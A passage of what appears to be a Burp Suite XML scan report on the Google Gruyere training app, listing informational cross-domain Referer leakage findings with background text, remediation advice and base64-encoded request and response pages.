jZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgoKICBNeSBTbmlwcGV0cwogIAoKPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicKICBvbmNsaWNrPSdfcmVmcmVzaFNuaXBwZXRzKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiLCAiNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tIiknCiAgaHJlZj0nIyc+UmVmcmVzaDwvYT48L2Rpdj4KPGRpdiBjbGFzcz0nY29udGVudCc+CgoKCgogIAogIAogICAgCiAgICAgIE5vIHNuaXBwZXRzLgogICAgCiAgICAKICAKICA8YnI+CiAgPGEgaHJlZj0nJz5NeSBzaXRlPC9hPgoKPC9kaXY+CjwvYm9keT4KPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2422130958806662144</serialNumber>
    <type>5243904</type>
    <name><![CDATA[Cross-domain Referer leakage]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page was loaded from a URL containing a query string:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/snippets.gtl</li></ul>The response contains the following link to another domain:<ul><li>https://images.google.com/?q=cheddar+cheese</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://images.google.com/?q=cheddar+cheese]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1jaGVkZGFyIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMmUwOWVmMTM3NmUxMWQ1MGNlMjAyMjM5OGQyNWQ4ZWYNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDozMSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzc3OA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIENoZWRkYXIgTWFjCiAgCgoKPC9oMj4KPGRpdiBjbGFzcz0ncmVmcmVzaCc+PGEgY2xhc3M9J2J1dHRvbicKICBvbmNsaWNrPSdfcmVmcmVzaFNuaXBwZXRzKCI0MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYiLCAiY2hlZGRhciIpJwogIGhyZWY9JyMnPlJlZnJlc2g8L2E+PC9kaXY+CjxkaXYgY2xhc3M9J2NvbnRlbnQnPgoKCiAgCiAgCiAgICAKICAgIAogICAgICA8dGFibGU+CiAgICAgICAgPHRyPjx0ZCBjb2xzcGFuPScyJz48Yj5BbGwgc25pcHBldHM6PC9iPjwvdGQ+PC90cj4KICAgICAgICAKICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkIHZhbGlnbj0ndG9wJz4KICAgICAgICAgICAgICA8c2NyaXB0PmRvY3VtZW50LndyaXRlKDAgKyAxKTwvc2NyaXB0PiZuYnNwOyZuYnNwOwogICAgICAgICAgICA8L3RkPgogICAgICAgICAgICA8dGQgdmFsaWduPSd0b3AnPgogICAgICAgICAgICAgIDxkaXYgaWQ9JzAnPgogICAgICAgICAgICAgICAgR3J1eWVyZSBpcyB0aGUgY2hlZXNpZXN0IGFwcGxpY2F0aW9uIG9uIHRoZSB3ZWIuCiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgIAogICAgICAgICAgPHRyPgogICAgICAgICAgICA8dGQgdmFsaWduPSd0b3AnPgogICAgICAgICAgICAgIDxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUoMSArIDEpPC9zY3JpcHQ+Jm5ic3A7Jm5ic3A7CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgIDx0ZCB2YWxpZ249J3RvcCc+CiAgICAgICAgICAgICAgPGRpdiBpZD0nMSc+CiAgICAgICAgICAgICAgICBJIHdvbmRlciBpZiB0aGVyZSBhcmUgYW55IHNlY3VyaXR5IGhvbGVzIGluIHRoaXMuLi4uCiAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgIAogICAgICA8L3RhYmxlPgogICAgICA8YnI+CiAgICAgIDxhIGhyZWY9J2h0dHBzOi8vaW1hZ2VzLmdvb2dsZS5jb20vP3E9Y2hlZGRhcitjaGVlc2UnPkNoZWRkYXIgTWFjJ3Mgc2l0ZTwvYT4KICAgIAogIAoKCgo8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>3893657427344580608</serialNumber>
    <type>5243904</type>
    <name><![CDATA[Cross-domain Referer leakage]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>When a web browser makes a request for a resource, it typically adds an HTTP header, called the "Referer" header, indicating the URL of the resource from which the request originated. This occurs in numerous situations, for example when a web page loads an image or script, or when a user clicks on a link or submits a form.</p>
<p>If the resource being requested resides on a different domain, then the Referer header is still generally included in the cross-domain request. If the originating URL contains any sensitive information within its query string, such as a session token, then this information will be transmitted to the other domain. If the other domain is not fully trusted by the application, then this may lead to a security compromise.</p>
<p>You should review the contents of the information being transmitted to other domains, and also determine whether those domains are fully trusted by the originating application.</p>
<p>Today's browsers may withhold the Referer header in some situations (for example, when loading a non-HTTPS resource from a page that was loaded over HTTPS, or when a Refresh directive is issued), but this behavior should not be relied upon to protect the originating URL from disclosure.</p>
<p>Note also that if users can author content within the application then an attacker may be able to inject links referring to a domain they control in order to capture data from URLs used within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should never transmit any sensitive information within the URL query string. In addition to being leaked in the Referer header, such information may be logged in various locations and may be visible on-screen to untrusted parties.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page was loaded from a URL containing a query string:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/snippets.gtl</li></ul>The response contains the following link to another domain:<ul><li>https://news.google.com/news/search?q=brie</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[https://news.google.com/news/search?q=brie]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsP3VpZD1icmllIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8NCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNDhjYWViNDQyYzhlZmRjNDE5YTNjNjE3ZmE0MDYxMTUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDozOCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzQ1OA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFNuaXBwZXRzPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjxzY3JpcHQgc3JjPSIvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xpYi5qcyIgdGV4dD0idGV4dC9qYXZhc2NyaXB0Ij4KPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgoKCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKPGRpdj4KPGgyIGNsYXNzPSdoYXMtcmVmcmVzaCcgaWQ9InVzZXJfbmFtZSI+CgogIEJyaWUKICAKCgo8L2gyPgo8ZGl2IGNsYXNzPSdyZWZyZXNoJz48YSBjbGFzcz0nYnV0dG9uJwogIG9uY2xpY2s9J19yZWZyZXNoU25pcHBldHMoIjQyMTY4Mzk2ODY1NTQ2OTI2MDU4N